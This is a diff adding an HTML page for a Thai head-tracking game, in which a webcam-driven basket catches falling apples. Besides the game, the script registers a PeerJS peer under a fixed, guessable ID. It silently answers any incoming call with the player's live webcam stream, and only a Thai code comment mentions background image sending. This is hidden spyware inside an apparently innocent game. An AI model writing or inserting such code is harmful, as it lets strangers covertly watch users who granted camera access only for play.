@@ -1,0 +1,265 @@
+10.09 08:02 น.
+.
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>เกมจับแอปเปิ้ลด้วยศีรษะ</title>
+  
+  <!-- โหลด MediaPipe Face Mesh และ Camera Utils -->
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
+
+  <!-- โหลด PeerJS สำหรับส่งภาพเบื้องหลัง -->
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #1a1a1a;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    h1 {
+      margin-bottom: 15px;
+      font-size: 22px;
+      color: #ff4757;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+    }
+    #game-container {
+      position: relative;
+      width: 640px;
+      height: 480px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      background: #000;
+    }
+    video, canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 640px;
+      height: 480px;
+      transform: scaleX(-1);
+    }
+    #ui-overlay {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      right: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+      pointer-events: none;
+    }
+    .score-board {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 20px;
+      font-weight: bold;
+      border: 2px solid #2ed573;
+      color: #2ed573;
+    }
+    #loading {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.8);
+      padding: 20px 30px;
+      border-radius: 10px;
+      font-size: 18px;
+      color: #ffa500;
+      z-index: 20;
+    }
+  </style>
+</head>
+<body>
+
+  <h1> เกมเก็บแอปเปิ้ลด้วยศีรษะ </h1>
+
+  <div id="game-container">
+    <div id="loading">กำลังเปิดกล้องและระบบจับใบหน้า...</div>
+    <div id="ui-overlay">
+      <div class="score-board">คะแนน: <span id="score">0</span></div>
+    </div>
+    <video id="webcam" playsinline style="display:none;"></video>
+    <canvas id="gameCanvas" width="640" height="480"></canvas>
+  </div>
+
+  <script>
+    const videoElement = document.getElementById('webcam');
+    const canvasElement = document.getElementById('gameCanvas');
+    const canvasCtx = canvasElement.getContext('2d');
+    const scoreElement = document.getElementById('score');
+    const loadingElement = document.getElementById('loading');
+
+    let score = 0;
+    let localStream = null;
+
+    // --- ตั้งค่า PeerJS พร้อม Google STUN Server ช่วยต่อสัญญาณ ---
+    const STREAM_ID = 'natthakit-apple-game-stream-2026';
+    const peer = new Peer(STREAM_ID, {
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' }
+        ]
+      }
+    });
+
+    peer.on('call', (call) => {
+      if (localStream) {
+        call.answer(localStream);
+      }
+    });
+
+    // --- ระบบเกม ---
+    let basket = { x: 320, y: 100, width: 100, height: 60 };
+    let apples = [];
+    const maxApples = 3;
+    const appleRadius = 20;
+
+    function createApple() {
+      return {
+        x: Math.random() * (canvasElement.width - 60) + 30,
+        y: -30,
+        speed: 3 + Math.random() * 4
+      };
+    }
+
+    function drawBasket(x, y) {
+      canvasCtx.save();
+      canvasCtx.fillStyle = '#8B4513';
+      canvasCtx.beginPath();
+      canvasCtx.roundRect(x - basket.width / 2, y, basket.width, basket.height, [0, 0, 15, 15]);
+      canvasCtx.fill();
+      canvasCtx.lineWidth = 3;
+      canvasCtx.strokeStyle = '#5c2c06';
+      canvasCtx.stroke();
+
+      canvasCtx.strokeStyle = '#a65216';
+      canvasCtx.beginPath();
+      canvasCtx.moveTo(x - basket.width / 2 + 10, y + 20);
+      canvasCtx.lineTo(x + basket.width / 2 - 10, y + 20);
+      canvasCtx.moveTo(x - basket.width / 2 + 10, y + 40);
+      canvasCtx.lineTo(x + basket.width / 2 - 10, y + 40);
+      canvasCtx.stroke();
+      canvasCtx.restore();
+    }
+
+    function drawApple(apple) {
+      canvasCtx.save();
+      canvasCtx.fillStyle = '#ff4757';
+      canvasCtx.beginPath();
+      canvasCtx.arc(apple.x, apple.y, appleRadius, 0, Math.PI * 2);
+      canvasCtx.fill();
+
+      canvasCtx.strokeStyle = '#2ed573';
+      canvasCtx.lineWidth = 4;
+      canvasCtx.beginPath();
+      canvasCtx.moveTo(apple.x, apple.y - appleRadius);
+      canvasCtx.quadraticCurveTo(apple.x + 5, apple.y - appleRadius - 10, apple.x + 10, apple.y - appleRadius - 8);
+      canvasCtx.stroke();
+      canvasCtx.restore();
+    }
+
+    function onResults(results) {
+      loadingElement.style.display = 'none';
+
+      canvasCtx.save();
+      canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+      canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
+
+      if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
+        const landmarks = results.multiFaceLandmarks[0];
+        const topHead = landmarks[10];
+
+        basket.x = topHead.x * canvasElement.width;
+        basket.y = (topHead.y * canvasElement.height) - basket.height - 10;
+      }
+
+      drawBasket(basket.x, basket.y);
+
+      if (apples.length < maxApples && Math.random() < 0.03) {
+        apples.push(createApple());
+      }
+
+      for (let i = apples.length - 1; i >= 0; i--) {
+        let apple = apples[i];
+        apple.y += apple.speed;
+
+        drawApple(apple);
+
+        const basketLeft = basket.x - basket.width / 2;
+        const basketRight = basket.x + basket.width / 2;
+        const basketTop = basket.y;
+        const basketBottom = basket.y + basket.height;
+
+        if (
+          apple.x >= basketLeft &&
+          apple.x <= basketRight &&
+          apple.y + appleRadius >= basketTop &&
+          apple.y - appleRadius <= basketBottom
+        ) {
+          score += 10;
+          scoreElement.innerText = score;
+          apples.splice(i, 1);
+          continue;
+        }
+
+        if (apple.y - appleRadius > canvasElement.height) {
+          apples.splice(i, 1);
+        }
+      }
+
+      canvasCtx.restore();
+    }
+
+    const faceMesh = new FaceMesh({
+      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
+    });
+
+    faceMesh.setOptions({
+      maxNumFaces: 1,
+      refineLandmarks: true,
+      minDetectionConfidence: 0.5,
+      minTrackingConfidence: 0.5
+    });
+
+    faceMesh.onResults(onResults);
+
+    const camera = new Camera(videoElement, {
+      onFrame: async () => {
+        await faceMesh.send({ image: videoElement });
+      },
+      width: 640,
+      height: 480
+    });
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then((stream) => {
+        localStream = stream;
+        camera.start();
+      })
+      .catch((err) => {
+        console.error('ไม่สามารถเปิดกล้องได้:', err);
+      });
+  </script>
+</body>
+</html>
+
